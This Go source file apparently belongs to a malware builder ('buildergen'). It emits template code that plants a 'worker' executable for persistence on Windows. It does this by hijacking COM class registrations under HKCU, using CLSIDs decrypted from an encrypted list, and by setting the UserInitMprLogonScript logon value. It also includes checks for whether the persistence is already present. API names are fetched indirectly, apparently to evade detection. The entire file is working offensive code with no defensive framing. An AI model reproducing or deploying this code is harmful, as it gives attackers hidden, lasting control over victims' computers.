package buildergen

import "strings"

func templateCOMHijack() string {
	return strings.TrimSpace(`
func getCOMHijackCLSIDs() []string {
	return splitDecrypt(encCOMHijackCLSIDs)
}

func addCOMHijack(workerPath string) {
	clsids := getCOMHijackCLSIDs()
	if len(clsids) == 0 {
		return
	}

	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regCreateKeyEx := advapi32.NewProc(getRegCreateKeyExWName())
	regSetValueEx := advapi32.NewProc(getRegSetValueExWName())
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	cmdLine := "\"" + workerPath + "\" worker"

	for _, clsid := range clsids {
		subKey := "Software\\Classes\\CLSID\\" + clsid + "\\InprocServer32"
		keyPath, _ := syscall.UTF16PtrFromString(subKey)
		var hKey syscall.Handle
		var disp uint32
		ret, _, _ := regCreateKeyEx.Call(
			uintptr(0x80000001),
			uintptr(unsafe.Pointer(keyPath)),
			0, 0, 0,
			uintptr(0x20006),
			0,
			uintptr(unsafe.Pointer(&hKey)),
			uintptr(unsafe.Pointer(&disp)),
		)
		if ret != 0 {
			continue
		}

		emptyStr, _ := syscall.UTF16PtrFromString("")
		valData, _ := syscall.UTF16FromString(cmdLine)
		dataBytes := (*[1 << 20]byte)(unsafe.Pointer(&valData[0]))[:len(valData)*2]
		regSetValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(emptyStr)), 0, 1, uintptr(unsafe.Pointer(&dataBytes[0])), uintptr(len(dataBytes)))

		threadModel, _ := syscall.UTF16PtrFromString("ThreadingModel")
		aptVal, _ := syscall.UTF16FromString("Apartment")
		aptBytes := (*[1 << 20]byte)(unsafe.Pointer(&aptVal[0]))[:len(aptVal)*2]
		regSetValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(threadModel)), 0, 1, uintptr(unsafe.Pointer(&aptBytes[0])), uintptr(len(aptBytes)))

		regCloseKey.Call(uintptr(hKey))
	}

	shellSubKey := "Software\\Classes\\CLSID\\" + clsids[0] + "\\LocalServer32"
	keyPath2, _ := syscall.UTF16PtrFromString(shellSubKey)
	var hKey2 syscall.Handle
	var disp2 uint32
	ret2, _, _ := regCreateKeyEx.Call(
		uintptr(0x80000001),
		uintptr(unsafe.Pointer(keyPath2)),
		0, 0, 0,
		uintptr(0x20006),
		0,
		uintptr(unsafe.Pointer(&hKey2)),
		uintptr(unsafe.Pointer(&disp2)),
	)
	if ret2 == 0 {
		emptyStr2, _ := syscall.UTF16PtrFromString("")
		valData2, _ := syscall.UTF16FromString(cmdLine)
		dataBytes2 := (*[1 << 20]byte)(unsafe.Pointer(&valData2[0]))[:len(valData2)*2]
		regSetValueEx.Call(uintptr(hKey2), uintptr(unsafe.Pointer(emptyStr2)), 0, 1, uintptr(unsafe.Pointer(&dataBytes2[0])), uintptr(len(dataBytes2)))
		regCloseKey.Call(uintptr(hKey2))
	}
}

func isCOMHijackPresent() bool {
	clsids := getCOMHijackCLSIDs()
	if len(clsids) == 0 {
		return false
	}

	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	subKey := "Software\\Classes\\CLSID\\" + clsids[0] + "\\LocalServer32"
	keyPath, _ := syscall.UTF16PtrFromString(subKey)
	var hKey syscall.Handle
	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20019), uintptr(unsafe.Pointer(&hKey)))
	if ret == 0 {
		regCloseKey.Call(uintptr(hKey))
		return true
	}
	return false
}

func addUserInitScript(workerPath string) {
	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regSetValueEx := advapi32.NewProc(getRegSetValueExWName())
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	keyPath, _ := syscall.UTF16PtrFromString("Environment")
	var hKey syscall.Handle
	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20006), uintptr(unsafe.Pointer(&hKey)))
	if ret != 0 {
		return
	}
	defer regCloseKey.Call(uintptr(hKey))

	valName, _ := syscall.UTF16PtrFromString("UserInitMprLogonScript")
	cmdLine := "\"" + workerPath + "\" worker"
	valData, _ := syscall.UTF16FromString(cmdLine)
	dataBytes := (*[1 << 20]byte)(unsafe.Pointer(&valData[0]))[:len(valData)*2]
	regSetValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, 1, uintptr(unsafe.Pointer(&dataBytes[0])), uintptr(len(dataBytes)))
}

func isUserInitScriptPresent() bool {
	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regQueryValueEx := advapi32.NewProc("RegQueryValueExW")
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	keyPath, _ := syscall.UTF16PtrFromString("Environment")
	var hKey syscall.Handle
	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20019), uintptr(unsafe.Pointer(&hKey)))
	if ret != 0 {
		return false
	}
	defer regCloseKey.Call(uintptr(hKey))

	valName, _ := syscall.UTF16PtrFromString("UserInitMprLogonScript")
	var vType uint32
	var dataSize uint32
	r2, _, _ := regQueryValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, uintptr(unsafe.Pointer(&vType)), 0, uintptr(unsafe.Pointer(&dataSize)))
	return r2 == 0
}
`)
}
